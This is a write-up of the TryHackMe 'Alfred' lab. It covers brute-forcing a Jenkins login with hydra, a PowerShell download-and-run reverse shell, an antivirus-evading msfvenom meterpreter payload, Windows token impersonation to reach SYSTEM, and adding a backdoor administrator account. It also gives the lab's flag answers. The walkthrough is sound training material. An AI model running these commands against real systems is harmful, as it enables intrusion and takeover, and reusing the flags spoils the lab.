# Alfred

https://tryhackme.com/room/alfred

### Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.

## F3d3r!c0 | Nov 23th, 2020
_________________________________________________________

### [Task 1] Initial Access

![Alfred](https://i.imgur.com/OwWppVP.png)

In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access.

Since this is a Windows application, we'll be using [Nishang](https://github.com/samratashok/nishang) to gain initial access. The repository contains a useful set of scripts for initial access, enumeration and privilege escalation. In this case, we'll be using the [reverse shell scripts](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Please note that this machine **does not respond to ping** (ICMP) and may take a few minutes to boot up.
_________________________________________________________

How many ports are open? (TCP only)

```
$sudo nmap -A -T4 <Target_IP> -oN nmap_alfred
```
**Answer: 3**

What is the username and password for the log in panel(in the format username:password)

Brute form http-post-form using hydra:

Parameters for Hydra:
```
    URL: /j_acegi_security_check
    USER = j_username
    PASS = j_password
    Port = 8080
    Invalid login message = Invalid username or password
```
```
    hydra -s 8080 <Target_IP> http-form-post “/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password” -L user.txt -P rockyou.txt -t 10 -w 30
```

**Answer: admin:admin**

Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: 
```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```
You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: 
```
python3 -m http.server
```
1. Login to webpage using gathered credentials

![Login](https://miro.medium.com/max/495/1*3B3vaSjDtkpEB4AcK_o5cA.png)

![Configure](https://miro.medium.com/max/700/1*bOIfDiIny5l3dJPJfrgf-w.png)

2. Setup a python web server and netcat listener on kali

![Kali](https://miro.medium.com/max/700/1*9XtnE5pwS2bDZTtNPxZqZA.png)

    $ nc -lvnp 1337

    $python -m SimpleHTTPServer 8000

3. Download and run Invoke-PowerShellTcp.ps1 to target machine
```
powershell iex (New-Object Net.WebClient).DownloadString('http://<Local_IP>:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <Local_IP> -Port 1337
```

**Answer: No answer need**

What is the user.txt flag?
```
PS C:\Users\bruce\Desktop> dir

    Directory: C:\Users\bruce\Desktop
    Mode                LastWriteTime     Length Name                              
    ----                -------------     ------ ---    -                              
    a---        10/25/2019  11:22 PM         32 user.txt                          

PS C:\Users\bruce\Desktop> type user.txt
```
**Answer: 79007a09481963edf2e1321abd9ae2a0**

### [Task 2] Switching Shells

![meterpreter](https://i.imgur.com/c7WqHoH.png)

To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.

Use msfvenom to create the a windows meterpreter reverse shell using the following payload

    msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe

This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

After creating this payload, download it to the machine using the same method in the previous step:

powershell "(New-Object System.Net.WebClient).Downloadfile('http://<Local_IP>:8000/shell-name.exe','shell-name.exe')"

Before running this program, ensure the handler is set up in metasploit:

use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run

﻿This step uses the metasploit handler to receive the incoming connection from you reverse shell. Once this is running, enter this command to start the reverse shell

Start-Process "shell-name.exe"

This should spawn a meterpreter shell for you!
_________________________________________________________

What is the final size of the exe payload that you generated?

1. Generate Payload

    $msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<Local_IP> LPORT=1234 -f exe -o shell-name.exe

2.

    PS C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://<Local_IP>:8000/shell-name.exe','shell-name.exe')"

3.

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <Local_IP>
LHOST => <Local_IP>
msf6 exploit(multi/handler) > set LPORT 1234
msf6 exploit(multi/handler) > run
```
4.

    PS C:\Users\bruce\Desktop> Start-Process "shell-name.exe"



**Answer: 73802**

### [Task 3] Privilege Escalation

![Alfred](https://i.imgur.com/0eEIphY.png)

Now that we have initial access, let's use token impersonation to gain system access.

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:

* user SIDs(security identifier)
* group SIDs
* privileges

amongst other things. More detailed information can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

There are two types of access tokens:

* primary access tokens: those associated with a user account that are generated on log on
* impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

* SecurityAnonymous: current user/client cannot impersonate another user/client
* SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
* SecurityImpersonation: current user/client can impersonate the client's security context on the local system
* SecurityDelegation: current user/client can impersonate the client's security context on a remote system

where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:

* SeImpersonatePrivilege
* SeAssignPrimaryPrivilege
* SeTcbPrivilege
* SeBackupPrivilege
* SeRestorePrivilege
* SeCreateTokenPrivilege
* SeLoadDriverPrivilege
* SeTakeOwnershipPrivilege
* SeDebugPrivilege

There's more reading [here](https://www.exploit-db.com/papers/42556).
_________________________________________________________

View all the privileges using whoami /priv

    C:\Users\bruce\Desktop>whoami /priv
    whoami /priv

      PRIVILEGES INFORMATION
      ----------------------

      Privilege Name                  Description                               State   
      =============================== ========================================= ========
      SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
      SeSecurityPrivilege             Manage auditing and security log          Disabled
      SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
      SeLoadDriverPrivilege           Load and unload device drivers            Disabled
      SeSystemProfilePrivilege        Profile system performance                Disabled
      SeSystemtimePrivilege           Change the system time                    Disabled
      SeProfileSingleProcessPrivilege Profile single process                    Disabled
      SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
      SeCreatePagefilePrivilege       Create a pagefile                         Disabled
      SeBackupPrivilege               Back up files and directories             Disabled
      SeRestorePrivilege              Restore files and directories             Disabled
      SeShutdownPrivilege             Shut down the system                      Disabled
      SeDebugPrivilege                Debug programs                            Enabled <----
      SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
      SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
      SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
      SeUndockPrivilege               Remove computer from docking station      Disabled
      SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
      SeImpersonatePrivilege          Impersonate a client after authentication Enabled <----
      SeCreateGlobalPrivilege         Create global objects                     Enabled
      SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
      SeTimeZonePrivilege             Change the time zone                      Disabled
      SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

      C:\Users\bruce\Desktop>

**Answer: No answer need**

You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: *load incognito* to load the incognito module in metasploit. Please note, you may need to use the *use incognito* command if the previous command doesn't work. Also ensure that your metasploit is up to date.
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on <Local_IP>:1234
[*] Sending stage (175174 bytes) to <Target_IP>
[*] Meterpreter session 2 opened (<Local_IP>:1234 -> <Target_IP>:49222) at 2020-11-27 11:25:00 +0100

meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
alfred\bruce
NT AUTHORITY\IUSR
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON

meterpreter >
```

**Answer: No answer need**

To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the *impersonate_token "BUILTIN\Administrators"* command to impersonate the Administrators token. What is the output when you run the *getuid* command?
```
    meterpreter > impersonate_token "BUILTIN\Administrators"
    [-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
    [+] Delegation token available
    [+] Successfully impersonated user NT AUTHORITY\SYSTEM
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
    meterpreter >
```
**Answer: NT AUTHORITY\SYSTEM**

Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the *ps* command to view processes and find the PID of the services.exe process. Migrate to this process using the command *migrate PID-OF-PROCESS*

**Answer: No answer need**

read the root.txt file at C:\Windows\System32\config

1. download and unzip https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip
```
PS C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://<Local_IP>:8000/incognito2/incognito.exe','incognito.exe')"
PS C:\Users\bruce\Desktop> ./incognito.exe add_user dummy pass123
PS C:\Users\bruce\Desktop> ./incognito.exe add_localgroup_user Administrators dummy
```
2. on Kali shell
```
   $rdesktop -u dummy -p pass123 <Target_IP>
```
3. run cmd as Administrator


 ![Desktop](https://miro.medium.com/max/700/1*I_g6ea_ipdxnaWCrXFa9lA.png)    

**Answer: dff0f748678f280250f25a45b8046b4a**
